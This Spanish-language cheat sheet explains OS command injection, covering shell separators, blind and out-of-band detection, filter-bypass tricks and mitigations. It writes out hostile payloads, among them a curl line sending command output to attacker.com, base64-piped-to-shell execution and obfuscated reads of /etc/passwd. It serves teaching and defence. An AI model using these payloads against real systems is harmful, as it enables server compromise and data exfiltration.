---
icon: folder-open
---

# OS command injection

## 🔍 ¿Qué es OS Command Injection?

**OS Command Injection** (inyección de comandos del sistema) es una vulnerabilidad que permite a un atacante ejecutar comandos arbitrarios en el sistema operativo del servidor.

Ocurre cuando una aplicación pasa input del usuario directamente a comandos del sistema sin validación adecuada.

***

### ⚙️ Cómo funciona

Cuando una aplicación ejecuta comandos del sistema:

```bash
stockreader.pl 381 29
```

Si el usuario introduce:

```
381 & whoami &
```

Se ejecuta:

```bash
stockreader.pl 381 & whoami & 29
```

El comando inyectado se ejecuta con los mismos privilegios que la aplicación.

***

### 🔀 Separadores y encadenamiento de comandos

#### 🐧 Unix/Linux

* `;` → ejecuta ambos comandos
* `|` → pipe
* `||` → OR
* `&&` → AND
* `&` → ejecución en background
* `\n` → nueva línea

#### 🪟 Windows

* `&` → separador
* `&&` → AND
* `|` → pipe
* `||` → OR

#### 🔗 Ambos

* Backticks: `` `cmd` ``
* `$()` → sustitución de comandos

***

### 🎯 Tipos de command injection

#### 📡 In-Band

* La salida se ve directamente
* Ej: `; cat /etc/passwd`

#### 🌫️ Blind

No hay salida visible:

* **Time-based** → delays (`sleep`, `ping`)
* **Redirección** → escribir en archivos
* **Out-of-band** → DNS o HTTP

***

### 📍 Puntos comunes de inyección

* Inputs de usuario
* Parámetros GET/POST
* Cookies y headers
* Nombres de archivos
* Herramientas del sistema (ping, nslookup)
* Funciones de backup/restauración

***

### 🕵️ Técnicas de detección

#### ⏱️ Time-based

```bash
& ping -c 10 127.0.0.1 &
```

#### 📁 Redirección

```bash
& whoami > /var/www/output.txt &
```

#### 🌐 Out-of-band

```bash
& nslookup attacker.com &
& curl http://attacker.com?data=$(whoami) &
```

#### ❌ Error-based

```bash
& invalid_command 2>&1 &
```

***

### 💥 Impacto

* Compromiso total del servidor
* Exfiltración de datos
* Escalada de privilegios
* Movimiento lateral
* Persistencia (backdoors)
* Denegación de servicio
* Destrucción de datos

***

### 🚪 Bypass de filtros

#### 🔄 Técnicas comunes

* Variación de mayúsculas: `WhOaMi`
* Sustitución de comandos: `` `whoami` `` o `$(whoami)`
* Wildcards:

```bash
/???/??t /???/p??swd
```

* Variables de entorno: `$PATH`, `$HOME`
* Secuencias de escape: `\w\h\o\a\m\i`
* Hex:

```bash
\x77\x68\x6f\x61\x6d\x69
```

* Base64:

```bash
echo d2hvYW1p | base64 -d | sh
```

* Sin espacios:

```bash
cat</etc/passwd
```

* Nueva línea:

```
%0a
```

#### 📌 Bypass según contexto

➡️ **Sin espacios**

```bash
cat$IFS/etc/passwd
```

➡️ **Sin slash**

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
```

***

### 🛡️ Mitigación

#### ✅ Validación de entrada

* Whitelist de caracteres
* Bloquear metacaracteres:
  * `; | & $ > < \` \n\`

#### 🚫 Evitar ejecución de comandos

* Usar librerías nativas
* Evitar shell

#### 📍 Parametrización

* Usar funciones seguras como `execve()`

#### 🔒 Mínimo privilegio

* Ejecutar con permisos limitados
* Usar contenedores

#### ✍️ Escape de salida

* Escapar argumentos correctamente

#### 🛡️ Defensa en profundidad

* WAF
* Monitorización
* Auditorías

***

### 📖 Ejemplos reales

* **Shellshock (CVE-2014-6271)**
* **Log4Shell (CVE-2021-44228)**
* Vulnerabilidades en Struts2
* Fallos en ImageMagick
* Dispositivos IoT vulnerables
